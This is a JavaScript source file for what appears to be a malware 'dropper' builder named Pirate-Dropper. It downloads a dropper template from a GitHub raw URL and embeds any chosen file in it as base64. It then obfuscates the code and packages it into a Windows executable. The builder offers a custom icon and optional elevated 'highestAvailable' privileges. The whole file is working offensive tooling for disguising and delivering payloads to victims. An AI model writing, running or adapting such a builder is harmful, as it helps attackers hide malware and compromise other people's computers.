const JavaScriptObfuscator = require('javascript-obfuscator');
const fs = require('fs');
const https = require('https');
const prompt = require('prompt-sync')();
const exe = require("@angablue/exe");


var file = prompt("Enter the file for dropping: ");

var fileData = fs.readFileSync(file);


async function getCode() {
    try {
        const res = await new Promise((resolve, reject) => {
            https.get("https://raw.githubusercontent.com/Pirate-Devs/Pirate-Dropper/main/src/static/dropper.js", (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    resolve(data);
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
        return res;
    } catch (err) {
        console.error(err);
        return "";
    }
}

async function main() {
    var code = await getCode();
    code = code.replace("YOUR_FILE_ENDING_HERE", file.split(".")[1]);
    code = code.replace("BASE64ENCODEDSTUFFHERE", fileData.toString("base64"));

    var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
        compact: true,
        simplify: true,
        target: 'node',
        unicodeEscapeSequence: true
    });

    fs.writeFileSync("out.js", obfuscationResult.getObfuscatedCode(), "utf8");
    //fs.writeFileSync("out.js", code, "utf8");
    build_binary("out.js");
}

async function build_binary(file_path) {
    var file = `./${file_path}`;
    var icon_location = prompt("Enter the icon location or just press enter for none: ");
    var output_filename = prompt("Enter the output filename: ");
    output_filename += ".exe";

    var admin_exec = prompt("Do you want to run as admin? (y/n): ");
    var admin = false;
    if (admin_exec == "y") {
        admin = true;
    }

    var target = "latest-win-x64"

    var build = exe({
        entry: file,
        out: output_filename,
        pkg: ["-C", "GZip"],
        version: "1.0.0",
        //only define icon if it's not empty
        icon: icon_location == "" ? undefined : icon_location,
        target: target,
        executionLevel: admin ? "highestAvailable" : "asInvoker"
    });

    build.then(() => {
        console.log("Build successful!");
    }).catch((err) => {
        console.error(err);
    });
}

main();